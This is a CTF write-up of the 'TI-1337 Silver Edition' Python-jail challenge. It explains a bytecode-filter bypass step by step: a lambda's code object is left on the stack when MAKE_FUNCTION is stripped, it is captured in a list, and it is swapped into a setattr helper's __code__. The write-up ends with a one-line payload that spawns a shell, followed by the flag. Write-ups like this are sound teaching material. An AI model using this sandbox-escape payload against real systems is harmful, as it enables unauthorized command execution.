# TI-1337 Silver Edition
**Category:**  Misc

**Author:**  kmh

**Description:**
> Back in the day the silver edition was the top of the line Texas Instruments calculator, but now the security is looking a little obsolete. Can you break it?

TI-1337 Silver Edition is from what I can tell the fourth installation in a series of calculator-imitating, python-jail challenges from [kmh](https://twitter.com/themalwareman). His goal seems to be to create a perfectly safe calculator where only math and no shenanigans are allowed, but there is of course always some slight problem.

## Overview
In this challenge we are given `ti1337se.py`, as well as a Dockerfile. The Dockerfile initializes the python script and changes the flag to a random name, meaning we will most likely need to gain a shell to access it. 
```docker
FROM redpwn/jail:0.1.3

COPY --from=python:3.9 / /srv
COPY flag.txt /srv/
RUN chmod 444 /srv/flag.txt && mv /srv/flag.txt /srv/flag.`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20`.txt
COPY ti1337se.py /srv/app/run
RUN chmod 755 /srv/app/run
```
In the python script we are asked to enter calculations, and our input (in the form of python code) is then compiled to bytecode and passed through a number of different checks and filters before it is executed. 
```python
# irrelevant code omitted

banned = ["MAKE_FUNCTION", "CALL_FUNCTION", "CALL_FUNCTION_KW", "CALL_FUNCTION_EX"]

math = input("> ")
code = compile(math, "<math>", "exec")

bytecode = list(code.co_code)
instructions = list(dis.get_instructions(code))
for  i, inst  in  enumerate(instructions):
	if  inst.is_jump_target:
		print("Math doesn't need control flow!")
		sys.exit(1)
	nextoffset = instructions[i+1].offset  if  i+1 < len(instructions) else  len(bytecode)
	if  inst.opname  in  banned:
		bytecode[inst.offset:instructions[i+1].offset] = [-1]*(instructions[i+1].offset-inst.offset)
  
names = list(code.co_names)
for  i, name  in  enumerate(code.co_names):
	if  "__"  in  name: names[i] = "$INVALID$" 
code = code.replace(co_code=bytes(b  for  b  in  bytecode  if  b >= 0), co_names=tuple(names), co_stacksize=2**20)

v = {}
exec(code, {"__builtins__": {"gift": gift}}, v)
if  v: print("\n".join(f"{name} = {val}"  for  name, val  in  v.items()))
else: print("No results stored.")
```
As the print statement mentions, no control flow is allowed, although that will not be a huge issue. What is an issue however is that the opcodes in the `banned` list is, believe it or not, banned, which means we can't call nor create functions. We are also not allowed to use any attribute or variable name in our code that contains `__`, something very useful in most pyjails.

When we are done with all that our code is finally executed, but we don't have access to any built-in functions. We do however receive a `gift`, which is defined as follows:
```python
used_gift = False
def gift(target, name, value):
	global used_gift
	if used_gift: sys.exit(1)
	used_gift = True
	setattr(target, name, value)
```
It allows us to set an attribute on an object, and since the `name` variable is just a string, that means we can set attributes whose names include `__`, since names in the scope does not include the content of strings. It does however only allow us to use our gift once.
## Breaking out
### Calling `gift`
We can not just write `gift(target, name, value)` and expect it to execute, since the opcode `CALL_FUNCTION` and all its variants are banned. Looking into the documentation for [dis](https://docs.python.org/3/library/dis.html), the python bytecode disassembler, we find that the opcode for calling methods on objects is different than that of calling functions, and `CALL_METHOD` is allowed here.

Turning something into a method is about as straight forward as you might think, we just need to assign a function to an object and it turns into a method. The only object we have access to is `gift` itself, so the choice is fairly straight forward. This is therefore how we can call `gift`, by assigning it to itself and calling it as a method:

`gift.g=gift;gift.g(target, name, value)`

Now the question becomes, how can we gain RCE by via this?

### Filter consequences

Something worth noting is that functions we create are not sanitized from banned function calls like the main body is. It treats those functions as any other object and just glosses over them. 

But hang on, didn't I mention we couldn't create functions? Well, sort of. The opcode `MAKE_FUNCTION` is removed from whatever program we submit, but if we look at the [documentation](https://docs.python.org/3/library/dis.html) we see that `MAKE_FUNCTION`'s purpose is to combine a code object and a qualified name into a function object, from the stack. That means the code object and the name of the function we create stay on the stack, the function object is just never created. We can see this if we disassemble the bytecode before and after the filtering. Consider this line of code

`a=lambda: __import__('os').system('sh')`

The disassembly before any filters are run looks like this:
```
1             0 LOAD_CONST               0 (<code object <lambda> at 0x0000023C45071D10, file "<math>", line 1>)
              2 LOAD_CONST               1 ('<lambda>')
              4 MAKE_FUNCTION            0
              6 STORE_NAME               0 (a)
              8 LOAD_CONST               2 (None)
             10 RETURN_VALUE
```
The string `'<lambda>'` and the code object itself is loaded onto the stack, and after that `MAKE_FUNCTION` is called which pops both values of the stack and pushes the new function object onto the top of the stack, after which it is then popped off and stored into `a`.

But what happens then when the `MAKE_FUNCTION` call is removed? Well the function object is never created and the name and code object stay on the stack. When `a` is then loaded it pops the value that is at the top, so `a` gets set to the string `'<lambda>'`. We can see that this is indeed what happens when we run the program.
```
ti1337/> python3 ti1337se.py
Welcome to the TI-1337 Silver Edition. Enter your calculations below:
> a=lambda: __import__('os').system('sh')
a = <lambda>
```
### Stack shenanigans 
You might have seen where we are going with this. We now know that we can create any function we want, we just loose it to the stack. The trick here is that we can utilize this stack offset to capture the code object elsewhere.

This is the bytecode for `a=[1, 2, 3]`
```
  1           0 LOAD_CONST               0 (1)
              2 LOAD_CONST               1 (2)
              4 LOAD_CONST               2 (3)
              6 BUILD_LIST               3
              8 STORE_NAME               0 (a)
             10 LOAD_CONST               3 (None)
             12 RETURN_VALUE
```
The three values are pushed to the stack, and then `BUILD_LIST` with the count set to `3` consumes those three values from the stack and builds the list. So what happens now if we insert our lambda function into this list?

`a=[1, lambda: __import__('os').system('sh')]` compiles into
```
  1           0 LOAD_CONST               0 (1)
              2 LOAD_CONST               1 (<code object <lambda> at 0x7f0ee099f710, file "<math>", line 1>)
              4 LOAD_CONST               2 ('<lambda>')
              6 BUILD_LIST               2
              8 STORE_NAME               0 (a)
             10 LOAD_CONST               3 (None)
             12 RETURN_VALUE
```
Three values are now pushed onto the stack; the first element of the list (`1`) and both the function name and the code object. But since `MAKE_LIST` thinks it is receiving two arguments it only consumes our code object and the name. So now we have a reference to the code object, which we control, through `a[0]`! We can verify that this works:
```
ti1337/> python3 ti1337se.py
Welcome to the TI-1337 Silver Edition. Enter your calculations below:
> a=[1, lambda: __import__('os').system('sh')]
a = [<code object <lambda> at 0x7ff5ec1ee710, file "<math>", line 1>, '<lambda>']
```
### The payload
The final payload looks like this
`a=[1,lambda:__import__('os').system('sh')][0];gift.g=gift;gift.g(gift.g,'__code__',a); gift.g()`

These are the steps we take:

 - Capture the code object using a list with an entry we do not need, storing it in `a`
 - Set the gift as a method on itself making it callable
 - Using the gift we set its own code attribute to the custom one we created, which now has access to the normal `__builtins__` since it is running in the gift's scope.
 - Call gift again executing our own code object spawning a shell

Using this we can navigate to the right directory and cat the flag!

Flag: `dice{i_sh0uldve_upgr4ded_to_th3_color_edit10n}`
